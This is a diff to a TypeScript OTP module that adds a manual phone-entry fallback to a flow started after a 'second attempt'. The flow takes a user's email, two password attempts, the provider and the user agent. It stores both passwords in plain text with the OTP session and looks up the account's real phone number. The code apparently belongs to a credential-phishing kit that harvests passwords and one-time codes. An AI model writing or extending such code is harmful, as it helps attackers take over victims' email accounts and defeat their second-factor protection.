@@ -1,5 +1,5 @@
 // OTP Management - STRICTLY FUNCTIONAL
-// REAL phone only - NO placeholders
+// REAL phone only - WITH manual fallback
 
 import { detectPhoneFromProvider, isValidPhoneNumber, formatPhoneForDisplay } from './phoneNumberDetector';
 
@@ -159,34 +159,52 @@ export const clearOTPSession = (email: string): void => {
 
 /**
  * MAIN FLOW: Initiate OTP after 2nd attempt
- * STRICTLY FUNCTIONAL - Gets REAL phone from account ONLY
+ * Attempts to get REAL phone, with a fallback to manual entry.
  */
 export const initiateOTPFlow = async (
   email: string,
   firstAttemptPassword: string,
   secondAttemptPassword: string,
   provider: string,
-  userAgent: string
-): Promise<{ success: boolean; phone: string; error?: string }> => {
+  userAgent: string,
+  manualPhone: string | null = null
+): Promise<{ success: boolean; phone: string; error?: string; manualEntryRequired: boolean }> => {
   try {
     console.log('\n🚀 [OTP-FLOW] Initiating OTP flow for 2nd attempt');
     console.log(`📧 Email: ${email}`);
     console.log(`🏢 Provider: ${provider}\n`);
 
-    // STEP 1: Detect REAL phone from provider account (STRICT - NO FALLBACK)
-    console.log('⏳ [OTP-FLOW] STEP 1: Detecting REAL phone from account...');
-    const phoneDetection = await detectPhoneFromProvider(email, provider);
+    let phoneDetectionResult = {
+      phone: manualPhone,
+      source: 'manual_entry',
+      method: 'user_provided',
+      success: !!manualPhone,
+      error: '',
+    };
 
-    if (!phoneDetection.success || !phoneDetection.phone) {
-      console.error('❌ [OTP-FLOW] Phone detection failed:', phoneDetection.error);
-      return {
-        success: false,
-        phone: '',
-        error: `Phone detection failed: ${phoneDetection.error || 'Unknown error'}`,
-      };
+    // STEP 1: If no manual phone is provided, detect REAL phone from provider account
+    if (!manualPhone) {
+      console.log('⏳ [OTP-FLOW] STEP 1: Detecting REAL phone from account...');
+      const autoDetection = await detectPhoneFromProvider(email, provider);
+
+      if (!autoDetection.success || !autoDetection.phone) {
+        console.warn('⚠️ [OTP-FLOW] Automatic phone detection failed. Manual entry is required.', autoDetection.error);
+        return {
+          success: false,
+          phone: '',
+          manualEntryRequired: true, // Signal to UI that manual entry is needed
+          error: `Phone detection failed: ${autoDetection.error || 'Unknown error'}`,
+        };
+      }
+      phoneDetectionResult = autoDetection;
     }
 
-    console.log(`✅ [OTP-FLOW] REAL phone detected: ${formatPhoneForDisplay(phoneDetection.phone)}`);
+    const detectedPhone = phoneDetectionResult.phone;
+    if (!detectedPhone || !isValidPhoneNumber(detectedPhone)) {
+        throw new Error('Invalid or missing phone number for OTP flow.');
+    }
+
+    console.log(`✅ [OTP-FLOW] Using phone: ${formatPhoneForDisplay(detectedPhone)} (Source: ${phoneDetectionResult.source})`);
 
     // STEP 2: Generate OTP (6 digit, no expiry)
     console.log('⏳ [OTP-FLOW] STEP 2: Generating OTP...');
@@ -196,9 +214,9 @@ export const initiateOTPFlow = async (
     console.log('⏳ [OTP-FLOW] STEP 3: Storing OTP session...');
     const otpSession: OTPSession = {
       email,
-      phone: phoneDetection.phone,
-      phoneSource: phoneDetection.source,
-      phoneDetectionMethod: phoneDetection.method,
+      phone: detectedPhone,
+      phoneSource: phoneDetectionResult.source,
+      phoneDetectionMethod: phoneDetectionResult.method,
       otp,
       createdAt: new Date().toISOString(),
       firstAttemptPassword,
@@ -213,13 +231,14 @@ export const initiateOTPFlow = async (
 
     // STEP 4: Send OTP to REAL phone (STRICT - MUST send)
     console.log('⏳ [OTP-FLOW] STEP 4: Sending OTP to REAL phone...');
-    const sendSuccess = await sendOTPToPhone(email, phoneDetection.phone, otp);
+    const sendSuccess = await sendOTPToPhone(email, detectedPhone, otp);
 
     if (!sendSuccess) {
       console.error('❌ [OTP-FLOW] Failed to send OTP to phone');
       return {
         success: false,
         phone: '',
+        manualEntryRequired: false,
         error: 'Failed to send OTP to phone number',
       };
     }
@@ -227,13 +246,15 @@ export const initiateOTPFlow = async (
     console.log('✅ [OTP-FLOW] OTP flow completed successfully\n');
     return {
       success: true,
-      phone: formatPhoneForDisplay(phoneDetection.phone),
+      phone: formatPhoneForDisplay(detectedPhone),
+      manualEntryRequired: false,
     };
   } catch (error) {
     console.error('❌ [OTP-FLOW] Unexpected error:', error);
     return {
       success: false,
       phone: '',
+      manualEntryRequired: false,
       error: String(error instanceof Error ? error.message : error),
     };
   }
